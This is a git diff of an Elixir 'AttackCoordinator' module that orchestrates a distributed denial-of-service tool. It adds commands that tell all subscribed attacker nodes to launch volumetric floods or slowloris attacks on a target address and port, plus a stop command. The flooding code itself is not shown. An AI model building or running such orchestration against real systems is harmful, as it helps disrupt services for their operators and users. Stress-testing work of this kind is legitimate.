@@ -31,15 +31,22 @@ defmodule AttackCoordinator do
       {:subscribe, node} ->
         Logger.info("Attacker subscribed: #{inspect(node)}")
 
-        updated_attackers = Map.put(subscribed_attackers, node, 0)
+        updated_attackers = Map.put(subscribed_attackers, node, {false, 0})
         HelloWeb.Endpoint.broadcast("attacker", "attacker_list_update", updated_attackers)
         loop(updated_attackers)
 
+
+      {:attack_update, node, false} ->
+        updated_attackers = Map.put(subscribed_attackers, node, {false, 0})
+        HelloWeb.Endpoint.broadcast("attacker", "attacker_list_update", updated_attackers)
+
+        loop(updated_attackers)
+
       # Handles updates with the number of active workers on attacker nodes
-      {:attack_update, node, active_workers} ->
+      {:attack_update, node, true, active_workers} ->
         Logger.info("Update received from #{inspect(node)} with #{active_workers} active workers")
 
-        updated_attackers = Map.put(subscribed_attackers, node, active_workers)
+        updated_attackers = Map.put(subscribed_attackers, node, {true, active_workers})
 
         HelloWeb.Endpoint.broadcast("attacker", "attacker_list_update", updated_attackers)
 
@@ -49,8 +56,35 @@ defmodule AttackCoordinator do
       {:start_attack, workers, target, requests, method, attack_type} ->
         Logger.info("Starting attack on: \n#{inspect(subscribed_attackers)}")
 
-        for {node, _workers} <- subscribed_attackers do
+        for {node, {_processing, _workers}} <- subscribed_attackers do
           start_attack(node, workers, target, requests, method, attack_type)
+        end
+
+        loop(subscribed_attackers)
+
+      {:start_volumetric, target_address, target_port, workers} ->
+        Logger.info("Starting volumetric attack")
+        Logger.info("\tTarget: #{target_address}")
+        Logger.info("\tPort: #{target_port}")
+        Logger.info("\tWorkers: #{workers}")
+        Logger.info("On\n#{inspect subscribed_attackers}")
+
+        for {node, {_processing, _workers}} <- subscribed_attackers do
+          start_volumetric(node, target_address, target_port, workers)
+        end
+
+        loop(subscribed_attackers)
+
+      {:start_slowloris, target_address, target_port, workers, transmission_interval} ->
+        Logger.info("Starting slowloris attack")
+        Logger.info("\tTarget: #{target_address}")
+        Logger.info("\tPort: #{target_port}")
+        Logger.info("\tWorkers: #{workers}")
+        Logger.info("\tInterval: #{transmission_interval}ms")
+        Logger.info("On\n#{inspect subscribed_attackers}")
+
+        for {node, {_processing, _workers}} <- subscribed_attackers do
+          start_slowloris(node, target_address, target_port, workers, transmission_interval)
         end
 
         loop(subscribed_attackers)
@@ -72,6 +106,16 @@ defmodule AttackCoordinator do
         send(from, {:attacker_list, subscribed_attackers})
         loop(subscribed_attackers)
 
+
+      :stop_attack ->
+        for {node, {processing, _workers}} <- subscribed_attackers do
+          if processing do
+            send({:attack_supervisor, node}, :stop_attack)
+          end
+        end
+
+        loop(subscribed_attackers)
+
       msg ->
         Logger.info("Unhandled message received: #{inspect(msg)}")
         loop(subscribed_attackers)
@@ -83,6 +127,20 @@ defmodule AttackCoordinator do
     send(
       {:attack_supervisor, node},
       {:start, workers, target, requests, method, attack_type}
+    )
+  end
+
+  defp start_volumetric(node, target_address, target_port, workers) do
+    send(
+      {:attack_supervisor, node},
+      {:start_volumetric, target_address, target_port, workers}
+    )
+  end
+
+  defp start_slowloris(node, target_address, target_port, workers, interval) do
+    send(
+      {:attack_supervisor, node},
+      {:start_slowloris, target_address, target_port, workers, interval}
     )
   end
 end
